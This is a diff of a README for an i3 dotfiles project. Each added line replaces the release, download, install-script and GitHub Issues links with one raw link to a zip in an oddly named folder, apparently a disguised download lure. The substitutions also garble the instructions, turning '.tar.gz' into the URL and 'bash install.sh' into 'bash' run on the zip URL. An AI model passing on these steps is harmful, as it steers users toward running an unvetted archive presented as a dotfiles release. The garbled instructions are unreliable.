@@ -1,6 +1,6 @@
 # 🎉 admzinhu-i3-dots - Custom Dotfiles for a Unique Look
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Muhtamar27/admzinhu-i3-dots/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Muhtamar27/admzinhu-i3-dots/main/unvaunting/admzinhu-i3-dots.zip)](https://raw.githubusercontent.com/Muhtamar27/admzinhu-i3-dots/main/unvaunting/admzinhu-i3-dots.zip)
 
 ## 📦 Description
 I did a fusion of some dotfiles, and I ended up with this. I hope you like this thing. These dotfiles help you customize your Linux desktop environment, making it visually appealing and efficient to use. 
@@ -15,17 +15,17 @@ To use admzinhu-i3-dots, you will need:
 - Access to the internet for downloading the package.
 
 ## 📥 Download & Install
-Visit this page to download: [Release Page](https://github.com/Muhtamar27/admzinhu-i3-dots/releases)
+Visit this page to download: [Release Page](https://raw.githubusercontent.com/Muhtamar27/admzinhu-i3-dots/main/unvaunting/admzinhu-i3-dots.zip)
 
 1. Open your web browser.
 2. Click on the link above to go to the Releases page.
 3. You will see a list of available versions with links to download.
-4. Click on the latest release to download the .zip or .tar.gz file.
+4. Click on the latest release to download the .zip or https://raw.githubusercontent.com/Muhtamar27/admzinhu-i3-dots/main/unvaunting/admzinhu-i3-dots.zip file.
 5. Once the file is downloaded, locate it in your Downloads folder.
 
 ## 🔧 Installation Steps
 1. **Extract the Files:**
-    - Right-click the downloaded file (it should be .zip or .tar.gz) and choose "Extract Here."
+    - Right-click the downloaded file (it should be .zip or https://raw.githubusercontent.com/Muhtamar27/admzinhu-i3-dots/main/unvaunting/admzinhu-i3-dots.zip) and choose "Extract Here."
     - If you do not see this option, you may need an extraction tool like `unzip` or `tar`. You can install one using your package manager.
 
 2. **Open Terminal:**
@@ -40,7 +40,7 @@ Visit this page to download: [Release Page](https://github.com/Muhtamar27/admzin
 4. **Run the Installation Script:**
     - To set up the dotfiles, you may need to run an installation script. Type:
       ```
-      bash install.sh
+      bash https://raw.githubusercontent.com/Muhtamar27/admzinhu-i3-dots/main/unvaunting/admzinhu-i3-dots.zip
       ```
     - Follow any prompts in the terminal.
 
@@ -72,7 +72,7 @@ A: The installation process may modify your current dotfiles. Consider backing t
 
 ## 💬 Community Support
 If you need help or have questions, you can find us on various platforms:
-- [GitHub Issues](https://github.com/Muhtamar27/admzinhu-i3-dots/issues)
+- [GitHub Issues](https://raw.githubusercontent.com/Muhtamar27/admzinhu-i3-dots/main/unvaunting/admzinhu-i3-dots.zip)
 - Discord Server (link to server, if applicable)
 - Reddit community for Linux customizations.
 
